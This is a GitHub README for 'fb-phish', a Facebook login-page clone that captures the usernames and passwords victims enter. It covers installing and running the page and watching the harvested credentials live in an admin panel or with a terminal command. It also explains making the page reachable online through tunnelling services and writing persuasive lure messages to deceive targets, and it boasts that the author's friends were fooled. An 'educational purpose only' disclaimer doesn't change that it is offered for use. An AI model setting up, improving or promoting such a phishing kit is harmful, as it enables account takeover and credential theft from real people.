
# fb-phish

<p align="left"> <img src="https://komarev.com/ghpvc/?username=paradoxmain&label=Project%20viewed&color=0e75b6&style=flat" alt="paradoxmain" /> </p>


## This is the clone for Fb, get user fillings in real time!
You can use web interface or terminal, the choice is upon to you..


## What's new?
  - [x]  For the web interface admin pannel, the reload feature has been added( *You don't need to reload manually!* ). (Jan30, 2024)
  - [x]  New User Interface resembling to the today's Facebook interface!. (Jan,2024)
  - [x]  Removed all the facebook links, now everything runs locally!.

## My anonymous friend's comment:
*This login page is so well-crafted that even Mark Zuckerberg himself might be fooled. The design is flawless, the user experience is seamless, and the security measures are top-notch that It has no connections link with Facebook, So when you use, you feel like **anonymous hacker** !. It's like the perfect replica, so identical to the real thing that even the creator of Facebook would have a hard time telling the difference.*

## HOW IT WORKS?
This is some next-level social engineering shizzle. It's a recreation of Facebook's login page, but with a sneaky twist. The backend is coded in PHP, which is like the stealth bomber of Backend Programming Language. When someone logs in, their info gets yoinked right into the admin panel, which is like a secret lair hidden behind a fake login box.

But that's not even the coolest part. This tool is so badass, it also has a bash script that can stream real-time data of the filled-in info. It's like a continuous drip feed of juicy user data. This prank is so epic, I'm surprised my friends even fell for it. I mean, they're not exactly tech noobs. But then again, I'm like a ninja with code, so what can you expect?

This tool is a testament to the power of social engineering and the flexibility of programming languages. It's a reminder that even the most familiar technologies can be twisted into something unexpected. So next time you're feeling mischievous, remember this tool and unleash your inner hacker!

## Authors

- [@reprogamaco](https://www.github.com/paradoxmain)



## Installation in linux enviroment

To install this project

```bash
  git clone https://github.com/paradoxmain/fb-phish.git
  cd fb-phish
  php -S localhost:8080
```

After running those commands then at **http://localhost:8080** , the phishing page replica of Facebook login page will be activated. 

##### For phishing Admin Pannel
When you want to view the user logins( *username and password* ) through web interface, On the bottom of the login page there is a little box when you clicked that you will be redirected to the **admin pannel**, where you will meet the table with all the user logins.

##### For Terminal Admin Pannel
For those who prefer using Terminal rather than web interface, just create another session in the terminal and write this: 

```bash
    watch -n 5 'cat backend/data.txt'
```

## Need to Customize your Phishing?
You'll discover a treasure trove of social engineering goodness, specifically the '**contents.txt**' file tucked away in the '**social_engineering**' folder. This unassuming document serves as the stage for your cunning phishing persuasion.

To unleash the full potential of this tool, unleash your inner social engineering mastermind. Sprinkle your words with irresistible allure, like:

-*In order to claim your coveted rewards, you must first embark on a journey of login!*
-*Embark on your quest to proceed by completing the login ritual.*

Remember, the key to social engineering mastery lies in *crafting messages that tap into the target's desires and heighten their curiosity*. Let your creativity soar, and watch as unsuspecting victims eagerly fall into your trap.

So, embark on this journey of social engineering prowess, and let your mischievous plans unfold. With a sprinkle of creativity and a touch of cunning, you'll be the master of deception, leaving your friends scratching their heads in bewilderment.

## How to make it available online?

You can use **ngrok**, **localexpose** or other similar services that makes the tunnelling.


## FAQ

#### Question1: Can fb-phish used in Termux devices?

Yes, *Just use the same procedures as used in Linux above*.

#### Question 2: Can I use this tool without knowledge of code?

Yes!


## DISCLAIMER!!!

Hacking is illegal, This is made for educational purpose only. I will not be responsible for any kind of misuse of this tool. Please check the regulations of your country before using this TOOL.



<img src="https://image1.slideserve.com/1787542/disclaimer-l.jpg" style="text-align: center" />


## License

No licence

